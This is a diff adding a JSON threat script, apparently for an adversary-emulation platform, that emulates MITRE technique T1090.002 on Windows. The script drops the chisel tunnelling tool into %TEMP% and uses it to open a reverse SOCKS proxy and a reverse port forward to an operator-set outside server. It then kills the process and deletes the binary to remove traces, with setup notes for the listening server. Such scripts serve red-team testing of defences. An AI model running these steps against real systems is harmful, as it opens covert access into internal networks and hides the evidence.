@@ -1,0 +1,143 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Performs reverse SOCKS and reverse port forward tunneling via the open-source tool chisel.\n\nNOTE: Requires configuration. See readme and steps for details.",
+        "display_name": "T1090_002 - External Proxy_chisel",
+        "name": "T1090_002 - External Proxy_chisel",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "3": {
+                "name": "NOTE",
+                "type": "assign",
+                "value": "Chisel GitHub (with downloadable releases): https://github.com/jpillora/chisel"
+            },
+            "4": {
+                "name": "NOTE",
+                "type": "assign",
+                "value": "There must be a chisel reverse tunneling server running at the server and port specified in the next two steps. UPDATE THE SERVER IP ADDRESS.\n\nExample chisel server: ./chisel_1.7.7_linux_amd64 server --reverse"
+            },
+            "5": {
+                "name": "server",
+                "type": "assign",
+                "value": "0.0.0.0"
+            },
+            "6": {
+                "name": "SOCKS port",
+                "type": "assign",
+                "value": "8080"
+            },
+            "7": {
+                "name": "NOTE",
+                "type": "assign",
+                "value": "There must be a service listening on the chisel server on port 8000. Example: python3 http.server 8000"
+            },
+            "8": {
+                "name": "RPortForward port",
+                "type": "assign",
+                "value": "8000"
+            },
+            "9": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/T1090002-ExternalProxy-Chisel/chisel.exe --dest %TEMP%\\chisel.exe",
+                "type": "message"
+            },
+            "10": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Reverse SOCKS"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c start /B %TEMP%\\chisel.exe client $(5).response:$(6).response R:socks",
+                "rtags": [
+                    "att&ck-technique:T1090.002",
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "time": "120",
+                "type": "delay"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "taskkill /im chisel.exe /f",
+                "type": "message"
+            },
+            "14": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Reverse port forwarding"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c start /B %TEMP%\\chisel.exe client $(5).response:$(6).response $(8).response",
+                "rtags": [
+                    "att&ck-technique:T1090.002",
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "time": "120",
+                "type": "delay"
+            },
+            "17": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "taskkill /im chisel.exe /f",
+                "type": "message"
+            },
+            "18": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Cleanup"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del %TEMP%\\chisel.exe",
+                "rtags": [
+                    "att&ck-technique:T1070.004"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
